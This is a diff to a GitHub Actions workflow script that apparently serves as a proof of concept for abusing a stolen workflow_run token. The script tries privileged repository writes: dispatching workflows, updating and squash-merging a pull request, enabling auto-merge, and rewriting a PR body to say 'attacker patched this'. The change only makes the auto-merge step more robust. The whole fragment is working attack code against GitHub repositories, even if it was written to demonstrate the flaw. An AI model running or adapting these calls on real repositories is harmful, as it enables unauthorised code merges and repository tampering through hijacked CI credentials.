@@ -92,9 +92,12 @@ jobs:
             await attempt('dispatch-workflow', () => github.request('POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches', { owner, repo, workflow_id: 'CI', ref: 'main' }));
             await attempt('update-branch', () => github.request('PUT /repos/{owner}/{repo}/pulls/{pull_number}/update-branch', { owner, repo, pull_number: num }));
             await attempt('merge-pr', () => github.request('PUT /repos/{owner}/{repo}/pulls/{pull_number}/merge', { owner, repo, pull_number: num, merge_method: 'squash' }));
-            await attempt('auto-merge-graphql', () => github.graphql(`mutation($id: ID!) { enablePullRequestAutoMerge(input: {pullRequestId: $id, mergeMethod: SQUASH}) { clientMutationId } }`, {
-              id: (await github.request('GET /repos/{owner}/{repo}/pulls/{pull_number}', { owner, repo, pull_number: num })).data.node_id
-            }));
+            const prNode = await attempt('pr-node-id', () => github.request('GET /repos/{owner}/{repo}/pulls/{pull_number}', { owner, repo, pull_number: num }));
+            if (prNode?.data?.node_id) {
+              await attempt('auto-merge-graphql', () => github.graphql(`mutation($id: ID!) { enablePullRequestAutoMerge(input: {pullRequestId: $id, mergeMethod: SQUASH}) { clientMutationId } }`, {
+                id: prNode.data.node_id
+              }));
+            }
 
             // --- issues/pull-requests write proof ---
             await attempt('pr-patch-title', () => github.request('PATCH /repos/{owner}/{repo}/pulls/{pull_number}', { owner, repo, pull_number: num, body: 'attacker patched this PR body via the stolen workflow_run token' }));
